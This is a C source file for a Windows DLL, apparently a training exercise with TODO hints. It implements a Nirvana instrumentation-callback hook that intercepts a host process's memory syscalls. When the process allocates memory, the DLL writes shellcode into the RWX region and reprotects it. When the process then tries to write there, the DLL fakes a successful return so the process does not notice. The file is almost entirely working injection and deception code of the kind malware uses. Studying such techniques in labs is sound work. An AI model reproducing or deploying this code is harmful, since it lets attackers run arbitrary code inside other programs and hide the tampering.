#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <DbgHelp.h>
#include "main.h"


/*
 * Check if the *needle* substring is in the *haystack* string
 * Return 1 if the *needle* is found, 0 otherwise.
 */
int issubstr(const char* haystack, const char* needle) {
    int haystackLen = (int)strlen(haystack);
    int needleLen = (int)strlen(needle);

    for (int i = 0; i <= haystackLen - needleLen; i++) {
        int j;
        for (j = 0; j < needleLen; j++) {
            if (tolower(haystack[i + j]) != tolower(needle[j]))
                break;
        }
        if (j == needleLen)
            return 1;
    }
    return 0;
}


/*
 * Install the Nirvana Hook or remove the Nirvana hook
 * When used with hook = NULL, it removes the hook
 */
void install_nirvana(PVOID hook) {
    HMODULE NTDLL = GetModuleHandle("ntdll.dll");
    PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION InstrumentationCallbackInfo;
    pNtSetInformationProcess NtSetInformationProcess = (PVOID)GetProcAddress(NTDLL, "NtSetInformationProcess");
    InstrumentationCallbackInfo.Version = 0;
    InstrumentationCallbackInfo.Reserved = 0;
    InstrumentationCallbackInfo.Callback = hook;
    if(!hook) {
        printf("[+] Removing Nirvana Hook\n");
    }else {
        printf("[+] Install Nirvana hook\n");
    }
    NtSetInformationProcess(
        (HANDLE) -1,
        ProcessInstrumentationCallback,
        &InstrumentationCallbackInfo,
        sizeof(InstrumentationCallbackInfo)
    );

}

/*
 * Function used in the NirvanaHook to write the shellcode in the
 * memory space allocated by the target.
 * It changes the memory protection from RWX to RX to avoid further
 * modification by the target
 */
void inject_shellcode() {
    // Remove the nirvana hook to avoid interferences
    // during the shellcode deployment
    install_nirvana(NULL);

    void* address = NULL;
    printf("[+] Starting looking for memory\n");
    void* page_address = NULL;
    size_t page_size = 0;

    // Iterate over the process virtual memory to find
    // the RWX section allocated by the target process
    while (1) {
        MEMORY_BASIC_INFORMATION memInfo;
        size_t queryResult = VirtualQuery(address, &memInfo, sizeof(memInfo));
        // queryResult with be equal to 0 if we reach the end
        // of the process memory space. In this case we didn't
        // find any section in RWX...
        if (queryResult == 0) { break; }

        // Check if the current section has RWX rights
        // TODO: fix the condition to retrieve only RWX memory
        if (memInfo.State == MEM_COMMIT && memInfo.Protect == PAGE_EXECUTE_READWRITE) {
            // In this case we save the section address and get
            // out of this loop
            page_address = memInfo.BaseAddress;
            page_size = memInfo.RegionSize;
            break;
        }

        // If the section is not in RWX, we test the next section
        address = (void*)((char*)memInfo.BaseAddress + memInfo.RegionSize);
    }


    // No RWX section has been found, we exit the function
    if(!page_address) {
        printf("[x] Failed to found RWX memory\n");
        return;
    }

    printf("[+] Found allocated address : %p\n", page_address);

    // Now we can write the shellcode directly in the RWX section
    // previously found
    SIZE_T szOutput;
    // TODO: fix the WriteProcessMemory call to write the shellcode at the right address
    BOOL result = WriteProcessMemory((HANDLE)-1, page_address, shellcode, shellcode_size, &szOutput);
    if(result == FALSE) {
        printf("[x] Failed to write shellcode : %d\n", GetLastError());
        return;
    }
    printf("[+] Shellcode successfully written\n");

    // The target program will likely want to overwrite our shellcode
    // in this same memory. So we change the protection to prevent
    // any additional write action.
    DWORD oldProtect;
    // TODO: fix the VirtualProtect code to ensure the target program won't
    //       be able to write in the memory space while the shellcode will
    //       still be executable
    result = VirtualProtect(page_address, page_size, PAGE_EXECUTE_READ, &oldProtect);
    if(result == FALSE) {
        printf("[x] Failed to reprotect shellcode : %d\n", GetLastError());
    }
    printf("[+] Shellcode successfully reprotected\n");

    // We can reinstall the nirvana hook to catch the next NtWriteVirtualMemory
    // call the target program will likely perform (it didn't perform memory allocation
    // to not write anything on this section)

    // TODO: redeploy the nirvana hook to catch further SYSCALL
    install_nirvana(InstrumentationHook);
}


/*
 * The core nirvana hook. It will catch the result of two syscall
 *      - NtAllocateVirtualMemory: this will be caught in order to write the shellcode
 *        in the allocated section and reprotect the section to prevent any additional
 *        writing in this section
 *      - NtWriteVirtualMemory: this will prevent the program to get a FAIL result when
 *        it will try to write on the section we have just reprotected. It will just
 *        change the syscall FAIL SYSRET to make the target program believe that the write
 *        operation succeeds.
 */
DWORD64 InstrumentationCHook(DWORD64 Function, DWORD64 ReturnValue){
    static BOOLEAN g_Recurse = 0;
    DWORD64 result = ReturnValue;

    if (g_Recurse == 0){
        DWORD64 dwDisplacement = 0;
        DWORD64 dwAddress = Function;
        CHAR buffer[sizeof(SYMBOL_INFO) + MAX_SYM_NAME] = { 0 };
        PSYMBOL_INFO pSymbol = (PSYMBOL_INFO)buffer;

        g_Recurse = 1;

        pSymbol->SizeOfStruct = sizeof(SYMBOL_INFO);
        pSymbol->MaxNameLen = MAX_SYM_NAME;

        BOOL bRes = SymFromAddr((HANDLE)-1, dwAddress, &dwDisplacement, pSymbol);

        if (bRes && issubstr(pSymbol->Name, "AllocateVirtualMemory")) {
            // If the syscall is related to memory allocation we will
            // try to locate the RWX section and write the shellcode
            // in it.
            // We don't need to change the syscall here be cause we
            // want the program to know that the allocation succeeds.
            printf("[+] Catched Syscall Response from ! %p (%s+%lx) [SYSRET Code = %08lX]\n", (PVOID)Function, pSymbol->Name, (unsigned long)dwDisplacement, (unsigned long)ReturnValue);
            // TODO: call the right function here
            // Hint: We want to find the RWX memory allocated, write the shellcode
            //       reprotect the memory to stop further writing
            inject_shellcode();
        }
        else if (bRes && issubstr(pSymbol->Name, "WriteVirtualMemory")) {
            // This will catch the WriteVirtualMemory call. Here we
            // are changing the SYSRET code because the WRITE operation
            // will failed: we have changed the section protection to
            // prevent further write operation.
            printf("[+] Catched Syscall Response from ! %p (%s+%lx) [SYSRET Code = %08lX]\n", (PVOID)Function, pSymbol->Name, (unsigned long)dwDisplacement, (unsigned long)ReturnValue);
            // We also remove the NirvanaHook, we have finished what we
            // wanted to do
            install_nirvana(NULL);

            // We return a SYSRET of 0 (NT_SUCCESS)
            // TODO: Ensure that the target program will think that the write
            //       operation succeeded
            result = 0;
        }
        g_Recurse = 0;
    }
    return result;
}

void run() {
    SymInitialize((HANDLE)-1, NULL, TRUE);
    install_nirvana(InstrumentationHook);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     ){
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        run();
    }

    return TRUE;
}

